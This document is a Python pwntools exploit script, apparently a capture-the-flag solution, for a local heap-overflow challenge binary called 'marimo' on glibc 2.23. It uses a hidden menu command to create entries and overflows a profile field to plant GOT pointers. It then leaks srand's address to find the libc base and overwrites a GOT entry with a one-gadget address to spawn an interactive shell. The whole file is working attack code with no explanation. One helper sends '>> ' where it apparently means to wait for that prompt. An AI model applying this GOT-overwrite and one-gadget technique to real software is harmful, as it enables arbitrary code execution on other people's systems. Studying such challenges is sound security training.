from pwn import *

e = ELF('./marimo')
l = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
io = process('./marimo')

context.log_level='debug'

one_shot = 0x45216

def cheat(name, profile):
    io.recvuntil('>> ')
    io.sendline('show me the marimo')
    io.recvuntil('>> ')
    io.sendline(name)
    io.recvuntil('>> ')
    io.sendline(profile)

def view(idx):
    io.recvuntil('>> ')
    io.sendline('V')
    io.recvuntil('>> ')
    io.sendline(str(idx))

def modify(idx, profile):
    io.sendline('>> ')
    io.sendline('V')
    io.recvuntil('>> ')
    io.sendline(str(idx))
    io.recvuntil('>> ')
    io.sendline('M')
    io.recvuntil('>> ')
    io.sendline(profile)
    io.recvuntil('>> ')
    io.sendline('B')

cheat('AAAA','BBBB')
cheat('CCCC','DDDD')
payload = 'A'*0x38
payload += p64(e.got['srand'])
payload += p64(e.got['printf'])
sleep(3)

modify(0,payload)
view(1)


io.recvuntil('name : ')
srand_addr = u64(io.recv(6).ljust(8,'\x00'))
l.address = srand_addr - l.sym['srand']
libc_base_addr = l.address
log.info('libc base addr : 0x%x' % libc_base_addr)
log.info('oneshot addr : 0x%x' % (l.address+one_shot))
io.recvuntil('>> ')
io.sendline('M')
io.recvuntil('>> ')
io.sendline( p64(libc_base_addr + one_shot) )

io.interactive()
